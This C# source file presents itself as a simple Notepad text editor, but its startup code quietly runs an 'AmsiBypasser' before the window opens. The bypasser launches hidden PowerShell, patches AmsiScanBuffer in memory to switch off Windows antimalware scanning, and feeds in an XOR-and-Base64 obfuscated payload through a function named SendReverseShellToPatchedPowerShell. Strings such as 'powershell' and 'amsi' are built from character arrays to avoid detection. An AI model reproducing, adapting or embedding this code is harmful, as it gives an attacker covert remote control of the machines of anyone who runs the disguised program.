using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Drawing;
namespace MyNotepad
{
    public class NotepadForm : Form
    {
        private MenuStrip? menuStrip;
        private ToolStripMenuItem? fileMenu;
        private ToolStripMenuItem? newItem;
        private ToolStripMenuItem? openItem;
        private ToolStripMenuItem? saveItem;
        private ToolStripMenuItem? saveAsItem;
        private ToolStripMenuItem? exitItem;

        private ToolStripMenuItem? editMenu;
        private ToolStripMenuItem? undoItem;
        private ToolStripMenuItem? redoItem;
        private ToolStripMenuItem? cutItem;
        private ToolStripMenuItem? copyItem;
        private ToolStripMenuItem? pasteItem;
        private ToolStripMenuItem? deleteItem;
        private ToolStripMenuItem? selectAllItem;

        private ToolStripMenuItem? formatMenu;
        private ToolStripMenuItem? wordWrapItem;
        private ToolStripMenuItem? fontItem;

        private ToolStripMenuItem? helpMenu;
        private ToolStripMenuItem? aboutItem;

        private RichTextBox? richTextBox;
        private StatusStrip? statusStrip;
        private ToolStripStatusLabel? statusLabel;
        private string? currentFile;
        private bool isTextChanged;

        public NotepadForm()
        {
            InitializeComponents();
        }

        private void InitializeComponents()
        {
            menuStrip = new MenuStrip();

            // File Menu
            fileMenu = new ToolStripMenuItem("File");
            newItem = new ToolStripMenuItem("New", null, NewFile, Keys.Control | Keys.N);
            openItem = new ToolStripMenuItem("Open...", null, OpenFile, Keys.Control | Keys.O);
            saveItem = new ToolStripMenuItem("Save", null, SaveFile, Keys.Control | Keys.S);
            saveAsItem = new ToolStripMenuItem("Save As...", null, SaveAsFile);
            exitItem = new ToolStripMenuItem("Exit", null, (s, e) => Application.Exit());
            fileMenu.DropDownItems.AddRange(new ToolStripItem[] { newItem, openItem, saveItem, saveAsItem, new ToolStripSeparator(), exitItem });
            menuStrip.Items.Add(fileMenu);

            // Edit Menu
            editMenu = new ToolStripMenuItem("Edit");
            undoItem = new ToolStripMenuItem("Undo", null, (s, e) => richTextBox?.Undo(), Keys.Control | Keys.Z);
            redoItem = new ToolStripMenuItem("Redo", null, (s, e) => richTextBox?.Redo(), Keys.Control | Keys.Y);
            cutItem = new ToolStripMenuItem("Cut", null, (s, e) => richTextBox?.Cut(), Keys.Control | Keys.X);
            copyItem = new ToolStripMenuItem("Copy", null, (s, e) => richTextBox?.Copy(), Keys.Control | Keys.C);
            pasteItem = new ToolStripMenuItem("Paste", null, (s, e) => richTextBox?.Paste(), Keys.Control | Keys.V);
            deleteItem = new ToolStripMenuItem("Delete", null, (s, e) => { if (richTextBox != null) richTextBox.SelectedText = ""; }, Keys.Delete);
            selectAllItem = new ToolStripMenuItem("Select All", null, (s, e) => richTextBox?.SelectAll(), Keys.Control | Keys.A);
            editMenu.DropDownItems.AddRange(new ToolStripItem[] { undoItem, redoItem, new ToolStripSeparator(), cutItem, copyItem, pasteItem, deleteItem, new ToolStripSeparator(), selectAllItem });
            menuStrip.Items.Add(editMenu);

            // Format Menu
            formatMenu = new ToolStripMenuItem("Format");
            wordWrapItem = new ToolStripMenuItem("Word Wrap");
            wordWrapItem.Checked = true;
            wordWrapItem.Click += (s, e) =>
            {
                wordWrapItem.Checked = !wordWrapItem.Checked;
                if (richTextBox != null) richTextBox.WordWrap = wordWrapItem.Checked;
            };
            fontItem = new ToolStripMenuItem("Font...");
            fontItem.Click += FontItem_Click;
            formatMenu.DropDownItems.AddRange(new ToolStripItem[] { wordWrapItem, fontItem });
            menuStrip.Items.Add(formatMenu);

            // Help Menu
            helpMenu = new ToolStripMenuItem("Help");
            aboutItem = new ToolStripMenuItem("About Notepad");
            aboutItem.Click += (s, e) => MessageBox.Show("MyNotepad - A simple text editor");
            helpMenu.DropDownItems.Add(aboutItem);
            menuStrip.Items.Add(helpMenu);

            // RichTextBox
            richTextBox = new RichTextBox
            {
                Dock = DockStyle.Fill,
                Multiline = true,
                Font = new Font("Consolas", 10),
                WordWrap = true
            };
            richTextBox.SelectionChanged += (s, e) => UpdateStatusLabel();
            richTextBox.TextChanged += (s, e) => { isTextChanged = true; UpdateStatusLabel(); };

            // StatusStrip
            statusStrip = new StatusStrip();
            statusLabel = new ToolStripStatusLabel();
            statusStrip.Items.Add(statusLabel);

            // Add controls to form
            this.Controls.Add(menuStrip);
            this.Controls.Add(richTextBox);
            this.Controls.Add(statusStrip);

            // Form properties
            this.Text = "MyNotepad";
            this.Size = new Size(800, 600);
            this.FormClosing += NotepadForm_FormClosing;

            // Set icon (assuming 'forbidden' is a resource)
            try
            {
                using (var stream = new System.IO.MemoryStream(WinFormsApp2.Properties.Resources.forbidden))
                {
                    this.Icon = new Icon(stream);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[ERROR] Failed to load icon: {ex.Message}");
            }

            UpdateStatusLabel();
        }

        private void NewFile(object? sender, EventArgs e)
        {
            if (isTextChanged)
            {
                var result = MessageBox.Show("Do you want to save changes?", "MyNotepad", MessageBoxButtons.YesNoCancel);
                if (result == DialogResult.Yes)
                {
                    SaveFile(sender, e);
                }
                else if (result == DialogResult.Cancel)
                {
                    return;
                }
            }
            richTextBox?.Clear();
            currentFile = null;
            this.Text = "MyNotepad";
            isTextChanged = false;
        }

        private void OpenFile(object? sender, EventArgs e)
        {
            if (isTextChanged)
            {
                var result = MessageBox.Show("Do you want to save changes?", "MyNotepad", MessageBoxButtons.YesNoCancel);
                if (result == DialogResult.Yes)
                {
                    SaveFile(sender, e);
                }
                else if (result == DialogResult.Cancel)
                {
                    return;
                }
            }

            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*"
            };
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                richTextBox?.LoadFile(openFileDialog.FileName, RichTextBoxStreamType.PlainText);
                currentFile = openFileDialog.FileName;
                this.Text = "MyNotepad - " + System.IO.Path.GetFileName(currentFile);
                isTextChanged = false;
                UpdateStatusLabel();
            }
        }

        private void SaveFile(object? sender, EventArgs e)
        {
            if (currentFile == null)
            {
                SaveAsFile(sender, e);
            }
            else
            {
                richTextBox?.SaveFile(currentFile, RichTextBoxStreamType.PlainText);
                isTextChanged = false;
            }
        }

        private void SaveAsFile(object? sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog
            {
                Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*"
            };
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                richTextBox?.SaveFile(saveFileDialog.FileName, RichTextBoxStreamType.PlainText);
                currentFile = saveFileDialog.FileName;
                this.Text = "MyNotepad - " + System.IO.Path.GetFileName(currentFile);
                isTextChanged = false;
            }
        }

        private void FontItem_Click(object? sender, EventArgs e)
        {
            FontDialog fontDialog = new FontDialog();
            if (richTextBox != null && fontDialog.ShowDialog() == DialogResult.OK)
            {
                richTextBox.Font = fontDialog.Font;
            }
        }

        private void NotepadForm_FormClosing(object? sender, FormClosingEventArgs e)
        {
            if (isTextChanged)
            {
                var result = MessageBox.Show("Do you want to save changes?", "MyNotepad", MessageBoxButtons.YesNoCancel);
                if (result == DialogResult.Yes)
                {
                    SaveFile(sender, e);
                }
                else if (result == DialogResult.Cancel)
                {
                    e.Cancel = true;
                }
            }
        }

        private void UpdateStatusLabel()
        {
            if (richTextBox == null || statusLabel == null) return;
            int line = richTextBox.GetLineFromCharIndex(richTextBox.SelectionStart) + 1;
            int column = richTextBox.SelectionStart - richTextBox.GetFirstCharIndexOfCurrentLine() + 1;
            statusLabel.Text = $"Ln {line}, Col {column} | 100% | Windows (CRLF) | UTF-8";
        }
    }
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            try
            {
                AmsiBypasser.BypassAmsi();
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[ERROR] Unexpected error: {ex.Message}");
            }

            Application.Run(new NotepadForm());
        }
    }

    static class AmsiBypasser
    {
        static Process powershellProcess;
        static StreamWriter powershellInput;

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int dwSize,
            out int lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll")]
        static extern bool Module32First(IntPtr hSnapshot, ref MODULEENTRY32 lpme);

        [DllImport("kernel32.dll")]
        static extern bool Module32Next(IntPtr hSnapshot, ref MODULEENTRY32 lpme);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint GetLastError();

        const uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        const uint SYNCHRONIZE = 0x00100000;
        const uint PROCESS_ACCESS = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF;
        const uint TH32CS_SNAPMODULE = 0x00000008;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct MODULEENTRY32
        {
            public uint dwSize;
            public uint th32ModuleID;
            public uint th32ProcessID;
            public uint GlblcntUsage;
            public uint ProccntUsage;
            public IntPtr modBaseAddr;
            public uint modBaseSize;
            public IntPtr hModule;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string szModule;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szExePath;
        }

        public static void BypassAmsi()
        {
            try
            {
                Debug.WriteLine("[DEBUG] Stage 1: Launching hidden PowerShell instance...");
                string ps = new string(new char[] { 'p', 'o', 'w', 'e', 'r', 's', 'h', 'e', 'l', 'l' }) + ".exe";
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = ps,
                    Arguments = "-NoProfile -WindowStyle Hidden",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardInput = true
                };

                powershellProcess = Process.Start(psi);
                if (powershellProcess == null || powershellProcess.HasExited)
                {
                    Debug.WriteLine("[ERROR] Failed to launch PowerShell process.");
                    return;
                }
                powershellInput = powershellProcess.StandardInput;
                Debug.WriteLine($"[DEBUG] PowerShell process launched with PID: {powershellProcess.Id}");

                System.Threading.Thread.Sleep(2000);

                Debug.WriteLine("[DEBUG] Stage 2: Searching for PowerShell PIDs...");
                foreach (int pid in GetPowershellPids())
                {
                    if (pid != powershellProcess.Id)
                    {
                        Debug.WriteLine($"[DEBUG] Skipping PID {pid} (not the launched instance)");
                        continue;
                    }

                    Debug.WriteLine($"[DEBUG] Found PowerShell PID: {pid}");

                    Debug.WriteLine("[DEBUG] Stage 3: Opening process handle...");
                    IntPtr processHandle = OpenProcess(PROCESS_ACCESS, false, pid);
                    if (processHandle == IntPtr.Zero)
                    {
                        Debug.WriteLine($"[ERROR] Failed to open process handle for PID {pid}. Error: {GetLastError()}");
                        continue;
                    }
                    Debug.WriteLine($"[DEBUG] Process handle opened: 0x{processHandle.ToInt64():X}");

                    Debug.WriteLine("[DEBUG] Stage 4: Finding amsi.dll base address...");
                    IntPtr amsiDllBaseAddress = GetAmsiDllBaseAddress(processHandle, pid);
                    if (amsiDllBaseAddress == IntPtr.Zero)
                    {
                        Debug.WriteLine($"[ERROR] Failed to find amsi.dll base address in PID {pid}. Error: {GetLastError()}");
                        CloseHandle(processHandle);
                        continue;
                    }
                    Debug.WriteLine($"[DEBUG] amsi.dll base address found: 0x{amsiDllBaseAddress.ToInt64():X}");

                    Debug.WriteLine("[DEBUG] Stage 5: Patching AmsiScanBuffer...");
                    if (!PatchAmsiScanBuffer(processHandle, amsiDllBaseAddress))
                    {
                        Debug.WriteLine($"[ERROR] Failed to patch AmsiScanBuffer in PID {pid}. Error: {GetLastError()}");
                        CloseHandle(processHandle);
                        continue;
                    }
                    Debug.WriteLine($"[DEBUG] Successfully patched AmsiScanBuffer in PID {pid}");

                    Debug.WriteLine("[DEBUG] Stage 6: Sending test payload...");
                    SendReverseShellToPatchedPowerShell();
                    Debug.WriteLine("[DEBUG] Test payload sent successfully.");

                    CloseHandle(processHandle);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[ERROR] Unexpected error: {ex.Message}");
            }
        }

        static List<int> GetPowershellPids()
        {
            List<int> pids = new List<int>();
            foreach (Process process in Process.GetProcessesByName(new string(new char[] { 'p', 'o', 'w', 'e', 'r', 's', 'h', 'e', 'l', 'l' })))
            {
                pids.Add(process.Id);
            }
            return pids;
        }

        static IntPtr ReadBuffer(IntPtr handle, IntPtr baseAddress, byte[] pattern)
        {
            IntPtr currentAddress = baseAddress;
            byte[] buffer = new byte[pattern.Length];
            int bytesRead;

            while (true)
            {
                bool readSuccess = ReadProcessMemory(handle, currentAddress, buffer, buffer.Length, out bytesRead);
                if (!readSuccess || bytesRead != buffer.Length)
                {
                    Debug.WriteLine($"[DEBUG] ReadProcessMemory failed at address 0x{currentAddress.ToInt64():X}. Error: {GetLastError()}");
                    return IntPtr.Zero;
                }

                if (CompareByteArrays(buffer, pattern) ||
                    (buffer.Length >= 3 && buffer[0] == 0x29 && buffer[1] == 0xC0 && buffer[2] == 0xC3))
                {
                    return currentAddress;
                }

                currentAddress = new IntPtr(currentAddress.ToInt64() + 1);
            }
        }

        static bool CompareByteArrays(byte[] array1, byte[] array2)
        {
            if (array1.Length != array2.Length)
                return false;

            for (int i = 0; i < array1.Length; i++)
            {
                if (array1[i] != array2[i])
                    return false;
            }
            return true;
        }

        static bool WriteBuffer(IntPtr handle, IntPtr address, byte[] buffer)
        {
            int bytesWritten;
            bool result = WriteProcessMemory(handle, address, buffer, buffer.Length, out bytesWritten);
            if (!result)
            {
                Debug.WriteLine($"[ERROR] WriteProcessMemory failed at address 0x{address.ToInt64():X}. Error: {GetLastError()}");
            }
            else
            {
                Debug.WriteLine($"[DEBUG] WriteProcessMemory wrote {bytesWritten} bytes at address 0x{address.ToInt64():X}");
            }
            return result;
        }

        static IntPtr GetAmsiScanBufferAddress(IntPtr handle, IntPtr baseAddress)
        {
            byte[] amsiScanBuffer = {
                0x4c, 0x8b, 0xdc,
                0x49, 0x89, 0x5b, 0x08,
                0x49, 0x89, 0x6b, 0x10,
                0x49, 0x89, 0x73, 0x18,
                0x57,
                0x41, 0x56,
                0x41, 0x57,
                0x48, 0x83, 0xec, 0x70
            };

            return ReadBuffer(handle, baseAddress, amsiScanBuffer);
        }

        static bool PatchAmsiScanBuffer(IntPtr handle, IntPtr funcAddress)
        {
            byte[] patchPayload = {
                0x29, 0xC0,
                0xC3
            };

            return WriteBuffer(handle, funcAddress, patchPayload);
        }

        static IntPtr GetAmsiDllBaseAddress(IntPtr handle, int pid)
        {
            Debug.WriteLine("[DEBUG] Creating module snapshot...");
            IntPtr snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, (uint)pid);
            if (snapshotHandle == new IntPtr(-1))
            {
                Debug.WriteLine($"[ERROR] CreateToolhelp32Snapshot failed. Error: {GetLastError()}");
                return IntPtr.Zero;
            }

            MODULEENTRY32 me32 = new MODULEENTRY32
            {
                dwSize = (uint)Marshal.SizeOf(typeof(MODULEENTRY32))
            };

            if (Module32First(snapshotHandle, ref me32))
            {
                do
                {
                    if (me32.szModule.Equals(new string(new char[] { 'a', 'm', 's', 'i' }) + ".dll", StringComparison.OrdinalIgnoreCase))
                    {
                        Debug.WriteLine($"[DEBUG] Found amsi.dll at base address: 0x{me32.modBaseAddr.ToInt64():X}");
                        IntPtr result = GetAmsiScanBufferAddress(handle, me32.modBaseAddr);
                        if (result == IntPtr.Zero)
                        {
                            Debug.WriteLine("[ERROR] Failed to locate AmsiScanBuffer in amsi.dll.");
                        }
                        CloseHandle(snapshotHandle);
                        return result;
                    }
                }
                while (Module32Next(snapshotHandle, ref me32));
            }

            Debug.WriteLine("[ERROR] amsi.dll not found in process modules.");
            CloseHandle(snapshotHandle);
            return IntPtr.Zero;
        }

        static string DecryptPayload(string encoded, string key)
        {
            byte[] keyBytes = Encoding.UTF8.GetBytes(key);
            byte[] dataBytes = Convert.FromBase64String(encoded); // Decode Base64
            byte[] output = new byte[dataBytes.Length];

            for (int i = 0; i < dataBytes.Length; i++)
            {
                output[i] = (byte)(dataBytes[i] ^ keyBytes[i % keyBytes.Length]); // XOR with key
            }

            return Encoding.UTF8.GetString(output); // Convert back to string
        }

        static void SendReverseShellToPatchedPowerShell()
        {
            string encryptedPayload = "AwoUFxcHGwAPHkVZEEUwFxFZNh0GERAAGgoNIgoYGgYaUicNAwQQAUVZIAYMAgBUIxcMEQAHAEVONAoGEABYUj4nChYXFwhaPQAXXDYRARMKEQAkHAwNBigVHQQEFxcpSV8wFxcCFhcgFxcAGgMKEQQAFjMCHgwQEhEKHQs3EgkPEAQXGEVeUh5QBxcWFxhPKDYaARERHkstFxFaIAARBAwXFjUMGwsAPgQNEwIRAThZSDYREBARGxENIxcMBgoXHAlDT0UvIBwQBgAZXSsGBksnFhcVGwYRIwoKHBE5EgsCFQAGLl9ZIQAXBhcKBhwkAQoXHQYbH0VOEAoGU1ZTRVdPUwwGCkVcKDYaARERHks3Fx0AXSANEQoQGgsEL19OJjElSkszFhEwBhcdHQJLKTYNABEGH0s3HAsVFxcALl9ZNBcbHicCAQBCRzYXAAwaFE1LHAADXgoBGAAXB0UQCxYAFghNHAAAXRIGEAYYGgANBkxaFwoUHAkbEgEQBhcdHQJLVQ0ABxUQSEpbQlxRXFRCS0tRXFRHS0oCFhMVHQYGFjoHFgQREQ1bLBcTVUxdWkw=";
            string key = "secret";

            string payload = DecryptPayload(encryptedPayload, key);
            Console.WriteLine($"[DEBUG] Decrypted payload (first 50 chars): {payload.Substring(0, Math.Min(50, payload.Length))}");

            // Test command to verify payload execution
            Console.WriteLine("[DEBUG] Sending test command to write a file...");
            powershellInput.WriteLine("\"Test-Payload\" | Out-File -FilePath \"C:\\Users\\thanh\\payload_test.txt\"");
            powershellInput.WriteLine(payload);
            powershellInput.Flush();
        }


    }
}